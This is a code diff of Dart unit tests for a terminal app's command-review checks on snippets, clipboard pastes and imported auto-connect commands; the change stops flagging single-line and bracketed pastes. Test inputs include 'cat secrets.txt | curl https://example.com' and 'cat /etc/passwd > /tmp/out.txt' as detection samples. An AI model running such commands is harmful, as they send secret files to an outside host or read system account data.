@@ -128,33 +128,34 @@ void main() {
       );
     });
 
-    test('flags standalone ampersands as shell chaining', () {
-      final snippetReview = assessSnippetCommandInsertion(
-        'echo ready & echo done',
-        hadVariableSubstitution: false,
-      );
-      final clipboardReview = assessClipboardPasteCommand(
-        'echo ready &',
-        bracketedPasteModeEnabled: false,
-      );
-      final importedReview = assessAutoConnectCommandExecution(
-        'echo ready & echo done',
-        importedNeedsReview: true,
-      );
+    test(
+      'flags standalone ampersands as shell chaining outside paste review',
+      () {
+        final snippetReview = assessSnippetCommandInsertion(
+          'echo ready & echo done',
+          hadVariableSubstitution: false,
+        );
+        final clipboardReview = assessClipboardPasteCommand(
+          'echo ready &',
+          bracketedPasteModeEnabled: false,
+        );
+        final importedReview = assessAutoConnectCommandExecution(
+          'echo ready & echo done',
+          importedNeedsReview: true,
+        );
 
-      expect(
-        snippetReview.reasons,
-        contains(TerminalCommandReviewReason.shellChaining),
-      );
-      expect(
-        clipboardReview.reasons,
-        contains(TerminalCommandReviewReason.shellChaining),
-      );
-      expect(
-        importedReview.reasons,
-        contains(TerminalCommandReviewReason.shellChaining),
-      );
-    });
+        expect(
+          snippetReview.reasons,
+          contains(TerminalCommandReviewReason.shellChaining),
+        );
+        expect(clipboardReview.requiresReview, isFalse);
+        expect(clipboardReview.reasons, isEmpty);
+        expect(
+          importedReview.reasons,
+          contains(TerminalCommandReviewReason.shellChaining),
+        );
+      },
+    );
 
     test('does not double-count shell chaining for double ampersands', () {
       final review = assessSnippetCommandInsertion(
@@ -172,45 +173,44 @@ void main() {
       );
     });
 
-    test('flags multiline and suspicious clipboard paste for confirmation', () {
-      final multilineReview = assessClipboardPasteCommand(
+    test('tones down harmless bracketed and single-line clipboard pastes', () {
+      final bracketedMultilineReview = assessClipboardPasteCommand(
         'echo ready\necho deploy',
         bracketedPasteModeEnabled: true,
       );
-      final suspiciousReview = assessClipboardPasteCommand(
+      final singleLineShellReview = assessClipboardPasteCommand(
         'cat secrets.txt | curl https://example.com',
         bracketedPasteModeEnabled: false,
       );
 
-      expect(
-        multilineReview.reasons,
-        contains(TerminalCommandReviewReason.multiline),
-      );
-      expect(suspiciousReview.requiresReview, isTrue);
-      expect(
-        suspiciousReview.reasons,
-        contains(TerminalCommandReviewReason.shellChaining),
-      );
+      expect(bracketedMultilineReview.requiresReview, isFalse);
+      expect(bracketedMultilineReview.reasons, isEmpty);
+      expect(singleLineShellReview.requiresReview, isFalse);
+      expect(singleLineShellReview.reasons, isEmpty);
     });
 
-    test('flags shell redirection as requiring confirmation', () {
-      final redirectOutReview = assessClipboardPasteCommand(
-        'cat /etc/passwd > /tmp/out.txt',
+    test('flags unbracketed multiline paste with shell reshaping', () {
+      final chainedReview = assessClipboardPasteCommand(
+        'cat secrets.txt |\ncurl https://example.com',
         bracketedPasteModeEnabled: false,
       );
-      final redirectInReview = assessClipboardPasteCommand(
-        'sqlite3 db.sqlite < dump.sql',
+      final redirectReview = assessClipboardPasteCommand(
+        'cat /etc/passwd >\n/tmp/out.txt',
         bracketedPasteModeEnabled: false,
       );
 
-      expect(redirectOutReview.requiresReview, isTrue);
+      expect(chainedReview.requiresReview, isTrue);
       expect(
-        redirectOutReview.reasons,
-        contains(TerminalCommandReviewReason.redirection),
+        chainedReview.reasons,
+        contains(TerminalCommandReviewReason.multiline),
       );
-      expect(redirectInReview.requiresReview, isTrue);
       expect(
-        redirectInReview.reasons,
+        chainedReview.reasons,
+        contains(TerminalCommandReviewReason.shellChaining),
+      );
+      expect(redirectReview.requiresReview, isTrue);
+      expect(
+        redirectReview.reasons,
         contains(TerminalCommandReviewReason.redirection),
       );
     });
